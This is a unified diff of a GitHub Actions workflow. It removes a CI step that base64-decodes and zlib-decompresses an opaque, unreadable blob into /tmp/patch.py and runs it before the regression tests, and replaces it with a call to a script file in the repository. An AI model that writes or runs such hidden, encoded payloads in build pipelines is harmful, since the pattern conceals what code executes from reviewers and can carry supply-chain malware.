@@ -19,10 +19,7 @@ jobs:
         with:
           python-version: '3.12'
       - name: Apply minimal generic clarification delta
-        shell: bash
-        run: |
-          python -c "import base64,zlib;open('/tmp/patch.py','wb').write(zlib.decompress(base64.b64decode('eNrdV1Fv2zYQfvevuOnFNqA6ycOGIZkHFEWBBdjarS324hgCI51sohKlkJQTLct/30dSluQk69J1y0P9kEjU8e743d3Hu0muq5JqYbeFvCRZ1pW29CteJ5OMc9JcFyLlpFIpzyzf2JiqIotJ8XVMhbjkYn46IfzSqlGWluRkFv5lBsG5/ybz7vM3SzoJ4u6nhTRM71tjuXx9I+0sj269yrtT4puaU8sZVYqpFDbdxrSpLN16RXdRUKzZNloFm52ns8G9k/lkUsMld5pZZHR6pGVdF3xU48gwbY6ksqxraGG9qFsoNRCvoUpkiVM6gwa3dICCt2xi/28aXTVsrKyUiU7pNrJtzXiIhNaijWKKSnFzjuO5ryff4V12L4OosVqqTSf7M6uN3Trh4+Pju7t4+hxm4gs1DWbo0V+UsUkBnbPvVL31T6Igke2kqXRLaSG0zGUq3IcQDjq3JI2LkJDKx7Fo6XrLCqmgcpkxoHQCCHd1TceL7789I2kRuB1r2mihrKFKU7oVasOGRGO3lZa2XUQ9KgMoZNItl4LGjsaTfwxeSKGrRmo4uKTVR24ph1H3XypCmtSsrYR5ZLBbVMhAfLiNkJ5St4k7j4eUhXLo3q2n/5fqeHTcwc4IgmoflYDFU85/7upSGbjJykps7YzFFJxAhcucrSwZciUqx4cXp+ij4SK4YdUgxAhvozSbqtgxKrBuLNktj9Ygaxp2h+ydXtAbH28jC3hQOGh2eCABgDhn7ZJk0Wcn3HUat00plPOwkKl0m0yDqpYwIIqC0kZrp6IDv8SziSmrPMDCfPRREJQ3YA6mnSjgUglL0HPJqWjASPgqUgvWabv0A9GBIc7CG/CBHtOUdcBdQA3WswIOXLawC0hTWUhfC4vpM0Bt2I6LaqgoglvUVo0/SqiNS/6vo/Jbn4EOiZ4SkOGG44B6fwTnj1+BzwiilSnlkotsQe88M3d0YZyPZaAMFy6c58XogJkWuTVntJWb7cN1gjfIgy7+fZ50adPBHvDSZSCsS4YV+J5auQth+xpybsQNm0ZmAhA9lRT99j5sjns6VhLWv+wC4ompGu20jpZwuyRig0/Op8xEDy+XEY9h4xA/L/psTjxqdwRZT96orqfChlyorj3f97v//MRlMf3XWw8vg4fO77V9hu/D5iVlworVyML6AD5cWP6yMihU67Jq1ks6FjN27ngL1DGsz+lH9CWezlQ7u78bDGb1sMkLoy/xVXN1wEzz0weBDE3k766mXmtd6Vl0rlBhMrvXlAynmU8/cezFhu3sIENX6/lXefxRuqDRF01hP4sdhlsKLWFSV8bm8mYWMmd/lSUjoXXsONe1hvNPUsKpx3CE3WOs8GzGw+jS3zA/kLtVuQDkq/WINgaRFxvhppZRAgHTenENCuMwUpiDqcRCzhy5v0k3lSRfPpR4QjEGDeZAGfsGM3SHq2hPM/eKe7/t1ds3H969fPUhef/qp9e/vFz2+8sq42LhdsPnVWT89BatV8frVeS8iw5a4C/0YoDx2d3/+866M9LPGKXQH9EtLWl6oS6UG5pDOENWJtdwM9GYWhE9zCaJNAnf4K5PED80YegVfIUmqkI7Usg//NvMlnXihvJQ8shC0w3Vwdp8NEo/MkZ7c84adc75vcvbe0rcGD3xGejS6S+cXELL')))"
-          python /tmp/patch.py
+        run: python .github/scripts/patch-confidence-clarification.py
       - name: Install project and run full regression
         run: |
           python -m pip install -e . pytest
